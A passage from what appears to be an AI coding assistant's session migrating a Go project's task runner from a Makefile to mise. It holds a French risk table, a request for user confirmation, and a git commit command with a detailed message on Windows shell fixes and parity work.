| `mise run run` reste bancal (binaire sans `.exe` sous Windows) | Moyenne | Le tester explicitement en phase 2 ; `mise run dev` reste le chemin normal |
| Un collaborateur tape `make` par réflexe | Faible | Aucun collaborateur pour l'instant (dépôt sans remote, 1 commit) — sinon, option du shim |
| `mise` non installé chez un futur contributeur | Faible | Documenter l'installation en tête de README |

**Complexité : Small.** Uniquement de la configuration et de la documentation, aucun code Go touché. Le vrai travail est en phase 2 — valider que les tâches fonctionnent réellement, ce qui n'est pas le cas aujourd'hui pour deux d'entre elles.

---

**EN ATTENTE DE CONFIRMATION** : je pars sur l'abandon de `VERSION`, le shell `bash -c`, et la suppression pure du Makefile. Tu confirmes, ou tu veux modifier un de ces trois points ?

cd "C:/Users/anthoni/projects/entire/anthnel/devex/devdesk" && git commit -q -F - <<'EOF'
chore: migrate task runner from Makefile to mise

mise.toml already duplicated most Makefile targets, so the two files had been
drifting. mise is now the single source of truth and the Makefile is removed.

Parity work:

- Port the `cover` target, the only one mise was missing.
- Drop `make help`; `mise tasks` lists every task with its description.
- Drop the unused VERSION variable rather than carrying dead configuration
  across. Wiring a real version through -ldflags is a separate change.

Windows correctness — mise runs task scripts through "cmd /c" by default, so
two tasks were silently broken there:

- `clean` used `rm -rf`, which cmd has no equivalent for.
- `run` used `./bin/dk`, a path form cmd does not accept.

Both now declare `shell = "bash -c"`. The global
`windows_default_inline_shell_args` setting was tried first but mise refuses it
from a non-global config, so the shell is declared per task instead.

Every task was executed to verify the migration. `test-race` fails on machines
without a C toolchain (`cgo: C compiler "gcc" not found`), which is the
documented prerequisite rather than a regression.

Docs updated in README.md and .claude/CLAUDE.md, including the Git Bash and C
compiler prerequisites.

Co-Authored-By: Claude Opus 5 <noreply@anthropic.com>
EOF
echo "=== LOG ===" && git log --oneline && echo "=== TREE ===" && git status --short && echo "(empty = clean)" && ls Makefile 2>&1
